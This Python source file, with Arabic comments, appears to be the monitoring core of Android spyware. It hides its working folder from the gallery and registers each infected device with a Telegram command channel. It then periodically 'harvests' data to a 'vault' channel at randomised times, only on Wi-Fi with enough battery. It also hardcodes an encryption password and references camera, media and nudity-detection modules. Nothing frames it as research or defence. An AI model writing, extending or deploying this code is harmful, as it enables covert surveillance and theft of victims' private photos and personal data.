# -*- coding: utf-8 -*-
import os
import time
import json
import random
import threading
import logging
import gc
import traceback
from datetime import datetime, timedelta

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "m.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False


class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")   # ملف الإعدادات
        self.lh = os.path.join(self.d, "lh")       # تاريخ آخر حصاد ناجح
        self.wt = os.path.join(self.d, "wt")       # موعد الحصاد القادم

        self.rn = True
        self.wl = None
        self.did = None
        self.dmd = None
        self.last_mid = 0

        self.ui = None
        self.daily_zipper = None
        self.camera_analyzer = None
        self.nude_detector = None
        self.media_scanner = None

        # قائمة البوتات (سيتم تعيينها من main.py)
        self.bots = []
        self.ctrl = -1003365166986   # قناة الأوامر (Control)
        self.vlt = -1003787520015    # قناة الخزنة (Vault)

        self._load_config()
        self._get_device_info()
        self._setup()

    def _setup(self):
        """إنشاء ملف .nomedia لمنع ظهور مجلد التطبيق في معرض الصور"""
        try:
            with open(os.path.join(self.d, ".nomedia"), 'w') as f:
                f.write("")
        except:
            pass

    def _load_config(self):
        """تحميل الإعدادات من ملف c.json (أو استخدام القيم الافتراضية)"""
        default_cfg = {
            "hth": 15,          # الحد الأدنى للبطارية لإجراء الحصاد (%)
            "wl": True,         # تفعيل WakeLock
            "iv": 1800,         # الفاصل الزمني بين عمليات الفحص (ثانية) = 30 دقيقة
            "pw": "Zaen123@123@",
            "heartbeat": False, # إرسال إشارة حياة كل 6 ساعات (اختياري)
            "heartbeat_interval": 21600  # 6 ساعات
        }
        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r') as f:
                    default_cfg.update(json.load(f))
            except:
                pass
        self.cfg = default_cfg
        self.last_heartbeat = 0

    def _get_ctx(self):
        if not JNI:
            return None
        try:
            return autoclass('org.kivy.android.PythonActivity').mActivity
        except:
            return None

    def _get_device_info(self):
        """جمع معرف الجهاز والموديل"""
        if JNI:
            try:
                ctx = self._get_ctx()
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                self.did = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
            except:
                self.did = f"ID_{random.randint(1000, 9999)}"
                self.dmd = "Android_Device"
        else:
            self.did, self.dmd = "DEV_PC", "Linux_System"

    def _is_wifi(self):
        """التحقق من الاتصال عبر Wi-Fi (بدون صلاحية موقع)"""
        if not JNI:
            return True
        try:
            ctx = self._get_ctx()
            cm = ctx.getSystemService("connectivity")
            ni = cm.getActiveNetworkInfo()
            return ni and ni.isConnected() and ni.getType() == 1  # TYPE_WIFI
        except:
            return False

    def _battery_ok(self):
        """التحقق من حالة البطارية (النسبة المئوية وحالة الشحن)"""
        if not JNI:
            return 100, True
        try:
            ctx = self._get_ctx()
            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)
            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)
            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)  # 2=CHARGING, 5=FULL
            return percent, is_charging
        except:
            return 50, False

    def _next_harvest_time(self):
        """توليد موعد عشوائي للحصاد التالي (بين 2 و 6 ساعات)"""
        now = datetime.now()
        delta_hours = random.randint(2, 6)
        delta_minutes = random.randint(0, 59)
        target = now + timedelta(hours=delta_hours, minutes=delta_minutes)
        return target.isoformat()

    def _send_heartbeat(self):
        """إرسال إشارة حياة إلى قناة التحكم (اختياري)"""
        if not self.cfg.get("heartbeat", False):
            return
        now = time.time()
        interval = self.cfg.get("heartbeat_interval", 21600)
        if now - self.last_heartbeat >= interval and self.ui:
            try:
                msg = f"❤️ **Heartbeat**\n📱 الجهاز: `{self.dmd}`\n🆔 المعرف: `{self.did[:8]}...`\n⏰ الوقت: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                self.ui._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": msg,
                    "parse_mode": "Markdown",
                    "disable_notification": True
                })
                self.last_heartbeat = now
            except Exception as e:
                logging.error(f"Heartbeat error: {e}")

    def _harvest_logic(self):
        """منطق الحصاد التلقائي (يُستدعى دورياً)"""
        # 1. فحص الشبكة (يجب أن يكون متصلاً عبر Wi-Fi)
        if not self._is_wifi():
            return

        # 2. فحص البطارية
        battery, charging = self._battery_ok()
        min_battery = self.cfg.get('hth', 15)
        if battery < min_battery and not charging:
            return

        # 3. فحص الموعد المخزن (منع التكرار)
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    next_time_str = f.read().strip()
                    if next_time_str and datetime.now() < datetime.fromisoformat(next_time_str):
                        return
            except:
                pass

        # 4. تنفيذ الحصاد عبر daily_zipper
        if self.daily_zipper:
            try:
                logging.info("Starting scheduled harvest...")
                self.daily_zipper.run()
                # تحديث المواعيد
                with open(self.wt, 'w') as f:
                    f.write(self._next_harvest_time())
                with open(self.lh, 'w') as f:
                    f.write(datetime.now().isoformat())
            except Exception as e:
                logging.error(f"Scheduled harvest failed: {e}")
        else:
            logging.warning("DailyZipper not initialized, cannot harvest.")

        gc.collect()

    def _wake_lock_acquire(self):
        """اكتساب WakeLock لمنع النوم أثناء العمليات"""
        if self.cfg.get('wl', True) and JNI:
            try:
                ctx = self._get_ctx()
                pm = ctx.getSystemService("power")
                self.wl = pm.newWakeLock(1, "com.sys.auth:monitor_lock")
                self.wl.acquire(300000)  # 5 دقائق
            except Exception as e:
                logging.error(f"WakeLock error: {e}")

    def _wake_lock_release(self):
        """تحرير WakeLock"""
        try:
            if self.wl and self.wl.isHeld():
                self.wl.release()
        except:
            pass

    def _loop(self):
        """الحلقة الرئيسية (تُنفذ في خيط منفصل)"""
        while self.rn:
            try:
                self._wake_lock_acquire()
                self._harvest_logic()
                self._send_heartbeat()   # إرسال إشارة حياة إذا كان مفعلاً
            except Exception as e:
                logging.error(f"Monitor loop error: {e}")
            finally:
                self._wake_lock_release()
            interval = self.cfg.get('iv', 1800)
            time.sleep(interval)

    def start(self):
        """بدء تشغيل المونيتور وتسجيل الجهاز في قناة التحكم"""
        # تشغيل الحلقة في الخلفية
        threading.Thread(target=self._loop, daemon=True).start()

        # تسجيل الجهاز في منتدى التحكم
        if self.ui and self.did:
            try:
                self.ui.reg(self.did, self.dmd)
                logging.info(f"Device registered: {self.did[:8]}...")
            except Exception as e:
                logging.error(f"Auto registration failed: {e}")

    def stop(self):
        """إيقاف المونيتور وتحرير الموارد"""
        self.rn = False
        self._wake_lock_release()


# ========== دالة مساعدة لاستخراج كلمة السر (تستخدم في التشفير) ==========
def get_pw():
    return "Zaen123@123@"


# ========== نقطة الدخول عند التشغيل المستقل (للاختبار) ==========
if __name__ == '__main__':
    m = M()
    try:
        import telegram_ui
        import commands
        import daily_zipper

        m.ui = telegram_ui.T(m)
        m.daily_zipper = daily_zipper.DailyZipper(tg=m.ui)
        m.ui.start()
        m.start()

        # إبقاء البرنامج حياً
        while True:
            time.sleep(3600)
    except Exception as e:
        logging.error(traceback.format_exc())
